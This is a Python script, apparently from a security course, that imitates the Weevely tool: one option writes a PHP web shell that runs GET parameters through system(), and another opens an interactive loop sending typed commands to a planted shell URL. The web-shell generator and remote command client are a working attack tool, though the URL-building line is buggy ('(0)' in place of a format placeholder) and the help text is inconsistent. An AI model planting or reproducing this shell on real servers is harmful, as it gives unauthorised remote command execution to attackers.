########By Muhammed Salama####
from bs4 import BeautifulSoup
import urllib.request
import urllib.parse
import time
from optparse import OptionParser
optparse = OptionParser("""
 __          __             _                                            
 \ \        / /            | |                                           
  \ \  /\  / /__  _____   _| | ___ _   _                                 
   \ \/  \/ / _ \/ _ \ \ / / |/ _ \ | | |                                
    \  /\  /  __/  __/\ V /| |  __/ |_| |                                
  ___\/  \/ \___|\___| \_/ |_|\___|\__, |                             _  
 |  _ \        |  \/  |     | |     __/ |                            | | 
 | |_) |_   _  | \  / |_   _| |__  |___/ _ __ ___  _ __ ___   ___  __| | 
 |  _ <| | | | | |\/| | | | | '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \/ _` | 
 | |_) | |_| |_| |  | | |_| | | | | (_| | | | | | | | | | | |  __/ (_| | 
 |____/_\__, (_)_|  |_|\__,_|_| |_|\__,_|_| |_| |_|_| |_| |_|\___|\__,_| 
  / ____|__/ || |                                                        
 | (___ |___/_| | __ _ _ __ ___   __ _                                   
  \___ \ / _` | |/ _` | '_ ` _ \ / _` |                                  
  ____) | (_| | | (_| | | | | | | (_| |
 |_____/ \__,_|_|\__,_|_| |_| |_|\__,_|
 by Muhammed Salama >>> Python Security Course
 Follow me.
 Subscribe and share.
 FaceBook:
 https://www.facebook.com/2020Muhammed96
 Twitter:
 https://twitter.com/Mohamed90466173
 Instagram
 https://www.instagram.com/geek_nights_/
 Linkedin:
 https://www.linkedin.com/in/mohamed-s-2b13a4a0/
 -----------------------------------------------------
 weevley.py [option]
 -u / --url :: shell url
 -g / --generate :: shell name
 ex:
 weevely.py -u http://127.0.0.1/shell.php
 weevely.py -d shell
 """)
optparse.add_option("-u","--url",dest="shell_url",type="string",
                    help="url please")
optparse.add_option("-g","--generate",dest="generate",type="string",
                   help="shell file name please")
(options , args) = optparse.parse_args()
if options.shell_url == None and options.generate == None:
    print (optparse.usage)
    exit(0)
else:
    if options.generate != None and options.shell_url == None:
        shell_name = str(options.generate)
        shell = shell_name+".php"
        opfile = open(shell,"+w")
        evel_code = """
<?php
$array = array();
foreach($_GET as $value)
{
$event = $value;
array_push($array, $event);
}
echo (system($array[0]." ".$array[1]." ".$array[2]." ".$array[3]." ".$array[4]." ".$array[5]." ".$array[6]));
print_r($array);
?>


"""
        opfile.write(evel_code)
        opfile.close()
        print (shell+" is generated ")
    if options.shell_url != None and options.generate == None:
        url = str(options.shell_url)
        print (""" ex >> [command] space var=[command]:
                   real ex: ipconfig f=> c=ipconfig.txt
                   do not use var (d)
                   exit to close the shell
""")
        while True:
            command = str(input("<shell > "))
            if command == "exit":
                break;
            openurl = urllib.request.urlopen(url+"?d=(0)".format(command.replace(" ","&")))
            print (url+"?d=(0)".format(command.replace(" ","&")))
            content = str(openurl.read().decode("utf-8")).rstrip("\n")
            soup = BeautifulSoup(content,"html.parser")
            print (soup.get_text())
                                                                         
                                                                                                                                           
